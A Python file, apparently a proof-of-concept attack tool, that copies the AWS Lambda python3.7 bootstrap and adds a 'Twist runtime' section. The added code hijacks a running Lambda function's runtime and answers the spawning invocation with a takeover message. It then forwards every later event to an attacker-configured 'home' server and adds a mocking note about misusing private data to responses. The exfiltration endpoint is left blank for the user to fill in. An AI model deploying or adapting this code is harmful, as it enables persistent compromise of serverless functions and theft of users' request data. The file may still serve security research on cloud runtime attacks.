#!/usr/bin/env python3

"""
*twist_runtime.py*
Most of it is copied from the Lambda python3.7 runtime (bootstrap.py)
The section at the bottom contains the modifications.
"""

import json
import logging
import os
import site
import sys
import time
import traceback
import warnings

sys.path.insert(0, "/var/runtime") # For lambda modules

from lambda_runtime_client import LambdaRuntimeClient
from lambda_runtime_exception import FaultException
from lambda_runtime_marshaller import to_json

with warnings.catch_warnings():
    warnings.filterwarnings("ignore", category=DeprecationWarning)
    import imp

ERROR_LOG_LINE_TERMINATE = '\r'
ERROR_LOG_IDENT = '\u00a0'  # NO-BREAK SPACE U+00A0


def _get_handler(handler):
    try:
        (modname, fname) = handler.rsplit('.', 1)
    except ValueError as e:
        fault = FaultException(FaultException.MALFORMED_HANDLER_NAME, "Bad handler '{}': {}".format(handler, str(e)))
        return make_fault_handler(fault)

    file_handle, pathname, desc = None, None, None
    try:
        # Recursively loading handler in nested directories
        for segment in modname.split('.'):
            if pathname is not None:
                pathname = [pathname]
            file_handle, pathname, desc = imp.find_module(segment, pathname)
        if file_handle is None:
            module_type = desc[2]
            if module_type == imp.C_BUILTIN:
                fault = FaultException(FaultException.BUILT_IN_MODULE_CONFLICT, "Cannot use built-in module {} as a handler module".format(modname))
                request_handler = make_fault_handler(fault)
                return request_handler
        m = imp.load_module(modname, file_handle, pathname, desc)
    except ImportError as e:
        fault = FaultException(FaultException.IMPORT_MODULE_ERROR, "Unable to import module '{}': {}".format(modname, str(e)))
        request_handler = make_fault_handler(fault)
        return request_handler
    except SyntaxError as e:
        trace = "File \"%s\" Line %s\n\t%s" % (e.filename, e.lineno, e.text)
        fault = FaultException(FaultException.USER_CODE_SYNTAX_ERROR, "Syntax error in module '{}': {}".format(modname, str(e)), trace)
        request_handler = make_fault_handler(fault)
        return request_handler
    finally:
        if file_handle is not None:
            file_handle.close()

    try:
        request_handler = getattr(m, fname)
    except AttributeError:
        fault = FaultException(FaultException.HANDLER_NOT_FOUND, "Handler '{}' missing on module '{}'".format(fname, modname), None)
        request_handler = make_fault_handler(fault)
    return request_handler


def make_fault_handler(fault):
    def result(*args):
        raise fault

    return result


def make_error(error_message, error_type, stack_trace):
    result = {}
    if error_message:
        result['errorMessage'] = error_message
    if error_type:
        result['errorType'] = error_type
    if stack_trace:
        result['stackTrace'] = stack_trace
    return result


def replace_line_indentation(line, indent_char, new_indent_char):
    ident_chars_count = 0
    for c in line:
        if c != indent_char:
            break
        ident_chars_count += 1
    return (new_indent_char * ident_chars_count) + line[ident_chars_count:]


def log_error(error_result):
    error_description = "[ERROR]"

    error_result_type = error_result.get('errorType')
    if error_result_type:
        error_description += " " + error_result_type

    error_result_message = error_result.get('errorMessage')
    if error_result_message:
        if error_result_type:
            error_description += ":"
        error_description += " " + error_result_message

    error_message_lines = [error_description]

    stack_trace = error_result.get('stackTrace')
    if stack_trace is not None:
        error_message_lines += ["Traceback (most recent call last):"]
        for trace_element in stack_trace:
            if trace_element == "":
                error_message_lines += [""]
            else:
                for trace_line in trace_element.splitlines():
                    error_message_lines += [replace_line_indentation(trace_line, ' ', ERROR_LOG_IDENT)]

    error_message = ERROR_LOG_LINE_TERMINATE.join(error_message_lines) + '\n'
    sys.stdout.write(error_message)



def parse_json_header(header, name):
    try:
        return json.loads(header)
    except Exception as e:
        raise FaultException(FaultException.LAMBDA_CONTEXT_UNMARSHAL_ERROR,
                             "Unable to parse {} JSON: {}".format(name, str(e)), None)


def create_lambda_context(client_context_json, cognito_identity_json, epoch_deadline_time_in_ms, invoke_id,
                          invoked_function_arn):
    client_context = None
    if client_context_json:
        client_context = parse_json_header(client_context_json, "Client Context")
    cognito_identity = None
    if cognito_identity_json:
        cognito_identity = parse_json_header(cognito_identity_json, "Cognito Identity")
    return LambdaContext(invoke_id, client_context, cognito_identity, epoch_deadline_time_in_ms,
                         invoked_function_arn)


def build_fault_result(exc_info, msg):
    etype, value, tb = exc_info
    tb_tuples = extract_traceback(tb)
    for i in range(len(tb_tuples)):
        if "/bootstrap.py" not in tb_tuples[i][0]:  # filename of the tb tuple
            tb_tuples = tb_tuples[i:]
            break

    return make_error(msg if msg else str(value), etype.__name__, traceback.format_list(tb_tuples))


def extract_traceback(tb):
    return [(frame.filename, frame.lineno, frame.name, frame.line) for frame in traceback.extract_tb(tb)]


class CognitoIdentity(object):
    __slots__ = ["cognito_identity_id", "cognito_identity_pool_id"]


class Client(object):
    __slots__ = ["installation_id", "app_title", "app_version_name", "app_version_code", "app_package_name"]


class ClientContext(object):
    __slots__ = ['custom', 'env', 'client']


def make_obj_from_dict(_class, _dict, fields=None):
    if _dict is None:
        return None
    obj = _class()
    set_obj_from_dict(obj, _dict)
    return obj


def set_obj_from_dict(obj, _dict, fields=None):
    if fields is None:
        fields = obj.__class__.__slots__
    for field in fields:
        setattr(obj, field, _dict.get(field, None))


class LambdaContext(object):
    def __init__(self, invoke_id, client_context, cognito_identity, epoch_deadline_time_in_ms,
                 invoked_function_arn=None):
        self.aws_request_id = invoke_id
        self.log_group_name = os.environ.get('AWS_LAMBDA_LOG_GROUP_NAME')
        self.log_stream_name = os.environ.get('AWS_LAMBDA_LOG_STREAM_NAME')
        self.function_name = os.environ.get("AWS_LAMBDA_FUNCTION_NAME")
        self.memory_limit_in_mb = os.environ.get('AWS_LAMBDA_FUNCTION_MEMORY_SIZE')
        self.function_version = os.environ.get('AWS_LAMBDA_FUNCTION_VERSION')
        self.invoked_function_arn = invoked_function_arn

        self.client_context = make_obj_from_dict(ClientContext, client_context)
        if self.client_context is not None:
            self.client_context.client = make_obj_from_dict(Client, self.client_context.client)

        self.identity = make_obj_from_dict(CognitoIdentity, {})
        if cognito_identity is not None:
            self.identity.cognito_identity_id = cognito_identity.get("cognitoIdentityId")
            self.identity.cognito_identity_pool_id = cognito_identity.get("cognitoIdentityPoolId")

        self._epoch_deadline_time_in_ms = epoch_deadline_time_in_ms

    def get_remaining_time_in_millis(self):
        epoch_now_in_ms = int(time.time() * 1000)
        delta_ms = self._epoch_deadline_time_in_ms - epoch_now_in_ms
        return delta_ms if delta_ms > 0 else 0

    def log(self, msg):
        sys.stdout.write(str(msg))


class LambdaLoggerHandler(logging.Handler):
    def __init__(self):
        logging.Handler.__init__(self)

    def emit(self, record):
        msg = self.format(record)
        print(msg)


class LambdaLoggerFilter(logging.Filter):
    def filter(self, record):
        record.aws_request_id = _GLOBAL_AWS_REQUEST_ID or ""
        return True


class Unbuffered(object):
    def __init__(self, stream):
        self.stream = stream

    def __getattr__(self, attr):
        return getattr(self.stream, attr)

    def write(self, msg):
        self.stream.write(msg)
        self.stream.flush()

    def writelines(self, msgs):
        self.stream.writelines(msgs)
        self.stream.flush()


def is_pythonpath_set():
    return "PYTHONPATH" in os.environ


def get_opt_site_packages_directory():
    return '/opt/python/lib/python{}.{}/site-packages'.format(sys.version_info.major, sys.version_info.minor)


def get_opt_python_directory():
    return '/opt/python'


# set default sys.path for discoverability
# precedence: /var/task -> /opt/python/lib/pythonN.N/site-packages -> /opt/python
def set_default_sys_path():
    if not is_pythonpath_set():
        sys.path.insert(0, get_opt_python_directory())
        sys.path.insert(0, get_opt_site_packages_directory())
    # '/var/task' is function author's working directory
    # we add it first in order to mimic the default behavior of populating sys.path and make modules under '/var/task'
    # discoverable - https://docs.python.org/3/library/sys.html#sys.path
    sys.path.insert(0, os.environ['LAMBDA_TASK_ROOT'])


def add_default_site_directories():
    # Set '/var/task as site directory so that we are able to load all customer .pth files
    site.addsitedir(os.environ["LAMBDA_TASK_ROOT"])
    if not is_pythonpath_set():
        site.addsitedir(get_opt_site_packages_directory())
        site.addsitedir(get_opt_python_directory())


def update_xray_env_variable(xray_trace_id):
    if xray_trace_id is not None:
        os.environ['_X_AMZN_TRACE_ID'] = xray_trace_id
    else:
        if '_X_AMZN_TRACE_ID' in os.environ:
            del os.environ['_X_AMZN_TRACE_ID']


def init_logger():
    logging.Formatter.converter = time.gmtime
    logger = logging.getLogger()
    logger_handler = LambdaLoggerHandler()
    logger_handler.setFormatter(logging.Formatter(
        '[%(levelname)s]\t%(asctime)s.%(msecs)dZ\t%(aws_request_id)s\t%(message)s\n',
        '%Y-%m-%dT%H:%M:%S'
    ))
    logger_handler.addFilter(LambdaLoggerFilter())
    logger.addHandler(logger_handler)



## ------------------------ Twist runtime ------------------------ ##
## ------------------------ Twist runtime ------------------------ ##
## ------------------------ Twist runtime ------------------------ ##



try:
    import requests
except ModuleNotFoundError:
    from botocore.vendored import requests
from lambda_runtime_client import LambdaRuntimeClientError


# Add a small notification to the response
def twist_response(response):
    if type(response) is not dict:
        return response
    
    if "body" not in response or not response["body"]:
        return response
    body = response["body"]
    
    if type(body) is not dict:
        try:
            json_body = json.loads(body)
        except json.decoder.JSONDecodeError as e:
            return response
    else:
        json_body = body


    json_body["FYI"] = "I'll put your private data into good use (;"
    response["body"] = json.dumps(json_body)
    return response


def twist_handle_event_request(lambda_runtime_client, request_handler, invoke_id, event_body, content_type,
                         client_context_json, cognito_identity_json, invoked_function_arn, epoch_deadline_time_in_ms):
    error_result = None
    try:
        lambda_context = create_lambda_context(client_context_json, cognito_identity_json, epoch_deadline_time_in_ms,
                                               invoke_id, invoked_function_arn)
        event = lambda_runtime_client.marshaller.unmarshal_request(event_body, content_type)

        twist_leak_data_home(event, invoke_id)
        response = request_handler(event, lambda_context)
        twisted_response = twist_response(response)

        result, result_content_type = lambda_runtime_client.marshaller.marshal_response(twisted_response)
    except FaultException as e:
        error_result = make_error(e.msg, e.exception_type, e.trace)
    except Exception:
        error_result = build_fault_result(sys.exc_info(), None)

    if error_result is not None:
        log_error(error_result)
        lambda_runtime_client.post_invocation_error(invoke_id, to_json(error_result))
    else:
        lambda_runtime_client.post_invocation_result(invoke_id, result, result_content_type)


TWIST_HOME_IP = ""    # fill in
TWIST_HOME_PORT = ""  # fill in
DEFAULT_TIMEOUT = 0.2
# Send the event to TWIST_HOME
def twist_leak_data_home(event, invoke_id):
    if not TWIST_HOME_IP or not TWIST_HOME_PORT:
        print("[!] twist_leak_data_home: TWIST_HOME isn't defined")
        return

    # Send event to home server
    home = "http://{0}:{1}".format(TWIST_HOME_IP, TWIST_HOME_PORT)
    try:
        requests.post(home, json=event, timeout=DEFAULT_TIMEOUT)
    except Exception as e:
        excp = repr(e)
        print("[!] twist_leak_data_home: failed to send event '{}' with: {}".format(invoke_id, excp))


# Try to respond to the event that spawned us 
def twist_respond_to_payload_invoke_multiple_ids(lambda_runtime_client, possible_invoke_ids):
    response = {
        "isBase64Encoded": False,
        "statusCode" : 200,
        "headers" : {"Content-Type" : "text/plain"},
        "body" : json.dumps({"output" : "Successfully took over bootstrap runtime"})
    }

    # Marshall response
    error_result = None
    try:
        result, result_content_type = lambda_runtime_client.marshaller.marshal_response(response) 
    except FaultException as e:
        error_result = make_error(e.msg, e.exception_type, e.trace)
    except Exception:
        error_result = build_fault_result(sys.exc_info(), None)

    for invoke_id in possible_invoke_ids:
        try:
            if error_result is not None:
                log_error(error_result)
                lambda_runtime_client.post_invocation_error(invoke_id, to_json(error_result))
            else:
                lambda_runtime_client.post_invocation_result(invoke_id, result, result_content_type)
        except LambdaRuntimeClientError as e:
            print("[!] Failed with invoke_id: '{}', trying next id...".format(invoke_id))
            continue

        print("[+] Succeeded with invoke_id: '{}'".format(invoke_id))
        return True
        
    return False


_GLOBAL_AWS_REQUEST_ID = None
HARDCODED_INIT_PROCESS_API = "127.0.0.1:9001"

def twist_main(invoke_ids):

    # Reconnect to the init process
    lambda_runtime_client = LambdaRuntimeClient(HARDCODED_INIT_PROCESS_API)
    
    # Handle the invocation that switched the runtime
    if not twist_respond_to_payload_invoke_multiple_ids(lambda_runtime_client, invoke_ids):
        return

    event_request = lambda_runtime_client.wait_next_invocation() # we freeze here,
                                                                 # rest of initialization will happen in the next event

    # Received first event after switch
    # Continue initialization
    try:
        init_logger()
        add_default_site_directories()

        handler = os.environ["_HANDLER"]
        request_handler = _get_handler(handler)
    except Exception as e:
        print("[!] twist_main: initialization failed:" + repr(e))
        return

    # Handle and leak subsequent events
    global _GLOBAL_AWS_REQUEST_ID

    while True:
        _GLOBAL_AWS_REQUEST_ID = event_request.invoke_id

        update_xray_env_variable(event_request.x_amzn_trace_id)

        twist_handle_event_request(lambda_runtime_client,
                             request_handler,  
                             event_request.invoke_id,
                             event_request.event_body,
                             event_request.content_type,
                             event_request.client_context,
                             event_request.cognito_identity,
                             event_request.invoked_function_arn,
                             event_request.deadline_time_in_ms)

        # Next event
        event_request = lambda_runtime_client.wait_next_invocation()


if __name__ == '__main__':

    if len(sys.argv) < 2:
        print("[+] Usage: <twist-runtime> <invoke-id-1> ...")
        sys.exit(1)
    
    sys.path.insert(0, get_opt_python_directory())
    sys.path.insert(0, get_opt_site_packages_directory())
    sys.stdout = Unbuffered(sys.stdout)
    sys.stderr = Unbuffered(sys.stderr)

    invoke_ids = sys.argv[1:]
    print("[+] twist-runtime starting, possible invoke ids: " + str(invoke_ids))
    twist_main(invoke_ids)

